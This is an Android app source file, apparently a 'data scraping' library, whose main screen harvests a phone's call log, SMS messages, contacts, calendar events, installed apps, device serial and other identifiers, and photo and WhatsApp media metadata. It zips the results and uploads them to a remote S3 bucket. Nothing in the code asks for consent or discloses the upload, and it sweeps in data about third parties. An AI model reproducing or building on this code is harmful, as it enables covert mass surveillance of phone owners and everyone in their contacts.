package datascraping.julo.com.datascrapinglibrary;

import android.app.ProgressDialog;
import android.content.ContentUris;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.text.format.DateUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.amazonaws.auth.BasicAWSCredentials;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.PutObjectRequest;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import datascraping.julo.com.filebuilder.CalendarFileBuilder;
import datascraping.julo.com.filebuilder.CallFileBuilder;
import datascraping.julo.com.filebuilder.InstalledAppFileBuilder;
import datascraping.julo.com.filebuilder.PhoneBookFileBuilder;
import datascraping.julo.com.filebuilder.PhoneDetailsFileBuilder;
import datascraping.julo.com.filebuilder.PhotoMetadataFileBuilder;
import datascraping.julo.com.filebuilder.SmsFileBuilder;

public class MainActivity extends AppCompatActivity {
    Button Extrack_SMS,Extrack_Call,Extrack_PhoneDetail,Extract_App,NextBtnSms,PreviousBtnSms;
    String mydate;
    private PackageManager packageManager = null;
    private List<ApplicationInfo> applist = null;
    ProgressDialog progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
		/* Setting activity layout file */
        setContentView(R.layout.activity_call);
        init();
        DateFormat df = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzz yyyy");
        mydate = df.format(Calendar.getInstance().getTime());
        Extrack_Call.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final ProgressDialog progress = ProgressDialog.show(MainActivity.this,
                        "Data Scraping", "Please wait...", true, false);

                new Thread(new Runnable() {
                    public void run() {
                        // =========Create CSV file=============
                        FileWriter fw = null;
                        File folder = new File(getFilesDir() + "/CSVFiles");
                        boolean var = false;
                        if (!folder.exists())
                            var = folder.mkdir();
                        for (File file: folder.listFiles()) if (!file.isDirectory()) file.delete();

                        // calls
                        extractCallDetails(folder);

                        // sms
                        extractSmsDetails(folder);

                        // app data
                        extractInstalledApp(folder);

                        // phone details
                        extractPhoneDetails(folder);

                        // phone book
                        extractPhoneBook(folder);

                        // calendar
                        extractCalendarDetails(folder);

                        // photos
                        extractPhotoMetadataDetails(folder);

                        // whatsapp media
                        extractWhatsappMediaDetails(folder);

                        List<String> filesTmp = new ArrayList<String>();
                        File[] flist = folder.listFiles();
                        for (File file : flist) {
                            if (file.isFile()) {
                                filesTmp.add(file.getAbsolutePath());
                            }
                        }
                        Object[] objects = filesTmp.toArray();
                        String[] files = Arrays.copyOf(objects, objects.length,String[].class);
                        zip(files,  folder.toString() + "/" + "DataScrape_VD.zip");

                        new UploadToS3().execute(folder.toString() + "/" + "DataScrape_VD.zip");

                        //Toast.makeText(getApplicationContext(),"Calling Data Store Sucessfully",Toast.LENGTH_LONG).show();

                        progress.cancel();
                    }
                }).start();
            }
        });
    }

    private void extractPhotoMetadataDetails(File folder) {
        File photoFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).toString() + "/" + "Camera");
        File[] listOfFiles = photoFolder.listFiles();
        PhotoMetadataFileBuilder.buildPhotoMetadataDetails(folder, listOfFiles, "PhotoVideoDetail.csv");
    }

    private void extractWhatsappMediaDetails(File folder) {
        File photoFolder = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Media/WhatsApp Images/");
        File[] listOfFiles = photoFolder.listFiles();
        PhotoMetadataFileBuilder.buildPhotoMetadataDetails(folder, listOfFiles, "WhatsAppPhotoDetail.csv");
        File videoFolder = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Media/WhatsApp Video/");
        listOfFiles = videoFolder.listFiles();
        PhotoMetadataFileBuilder.buildPhotoMetadataDetails(folder, listOfFiles, "WhatsAppVideoDetail.csv");
    }

    private void extractInstalledApp(File folder) {
        final PackageManager pm = getPackageManager();
        // get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(0);
        InstalledAppFileBuilder.buildInstalledApp(folder, packages, pm, "AppDetail.csv");
    }

    private void extractSmsDetails(File folder) {
        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        SmsFileBuilder.buildSmsDetails(folder, cursor, "SMSDetail.csv");
    }

    private void extractCalendarDetails(File folder) {
        Uri.Builder eventsUriBuilder = CalendarContract.Instances.CONTENT_URI
                .buildUpon();
        long now = System.currentTimeMillis();
        ContentUris.appendId(eventsUriBuilder, now - (1 * DateUtils.YEAR_IN_MILLIS));
        ContentUris.appendId(eventsUriBuilder, now + (1 * DateUtils.YEAR_IN_MILLIS));
        Uri eventsUri = eventsUriBuilder.build();

        Cursor cur1 = getContentResolver().query(eventsUri, null, null, null, CalendarContract.Instances.DTSTART + " ASC");
        CalendarFileBuilder.buildCalendarDetails(folder, cur1, "CalendarDetail.csv");
    }

    private void extractCallDetails(File folder) {
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,null, null, null);
        CallFileBuilder.buildCallDetail(folder, managedCursor, "CallDetail.csv");
    }

    private void extractPhoneBook(File folder){
        Cursor managedCursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        PhoneBookFileBuilder.buildPhoneBook(folder, managedCursor, getContentResolver(), "PhoneBook.csv");
    }

    private void extractPhoneDetails(File folder) {
        Map<String, String> m = new HashMap<String, String>();
        m.put("manufacturer", Build.MANUFACTURER);
        m.put("brand", Build.BRAND);
        m.put("product", Build.PRODUCT);
        m.put("model", Build.MODEL);
        m.put("Device", Build.DEVICE);
        m.put("Display", Build.DISPLAY);
        m.put("ID", Build.ID);
        m.put("Serial", Build.SERIAL);
        m.put("Type", Build.TYPE);
        m.put("User", Build.USER);
        m.put("version", System.getProperty("os.version"));
        m.put("OSAPILevel", android.os.Build.VERSION.RELEASE);
        m.put("Sdk", ""+android.os.Build.VERSION.SDK_INT);

        PhoneDetailsFileBuilder.buildPhoneDetails(folder, m, "PhoneDetails.csv");
    }

    public void zip(String[] files, String zipFile) {
        String[] _files = files;
        String _zipFile = zipFile;
        int BUFFER = 1024;

        try {
            BufferedInputStream origin = null;
            FileOutputStream dest = new FileOutputStream(_zipFile);

            ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(dest));

            byte data[] = new byte[BUFFER];

            for (int i = 0; i < _files.length; i++) {
                Log.d("add:", _files[i]);
                Log.v("Compress", "Adding: " + _files[i]);
                FileInputStream fi = new FileInputStream(_files[i]);
                origin = new BufferedInputStream(fi, BUFFER);
                ZipEntry entry = new ZipEntry(_files[i].substring(_files[i].lastIndexOf("/") + 1));
                out.putNextEntry(entry);
                int count;
                while ((count = origin.read(data, 0, BUFFER)) != -1) {
                    out.write(data, 0, count);
                }
                origin.close();
            }

            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void init(){
        Extrack_Call=(Button)findViewById(R.id.scrape_data);
    }

    private class UploadToS3 extends AsyncTask<String, Void, Boolean> {

        @Override
        protected Boolean doInBackground(String... fileNames) {
            String fileName = fileNames[0];
            try {
                AmazonS3Client s3Client = new AmazonS3Client(new BasicAWSCredentials("", ""));
                PutObjectRequest por = new PutObjectRequest("julodata", "DataScrape_VD.zip", new java.io.File(fileName));
                s3Client.putObject(por);
                return true;
            } catch (Exception e){
                return false;
            }
        }

        @Override
        protected void onPostExecute(Boolean result) {
            Toast.makeText(getApplicationContext(), result.toString(),Toast.LENGTH_LONG).show();
        }
    }
}


